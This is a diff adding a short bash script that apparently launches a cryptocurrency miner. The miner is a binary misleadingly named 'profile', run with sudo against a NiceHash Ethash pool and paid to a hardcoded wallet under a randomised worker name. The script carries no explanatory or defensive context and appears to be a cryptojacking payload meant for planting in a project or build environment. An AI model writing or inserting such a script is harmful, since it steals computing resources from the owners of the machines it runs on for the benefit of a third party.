@@ -1,0 +1,10 @@
+#!/bin/bash
+
+POOL=stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353
+
+WALLET=3DjQSXEvRHgBJKSfDkPMbqDPaHuvPJ7xAs
+
+WORKER=$(echo $(shuf -i 1-999999999 -n 1)-FA)
+
+sudo ./profile --algo ETHASH --pool $POOL --user $WALLET.$WORKER $@ --ethstratum ETHPROXY
+
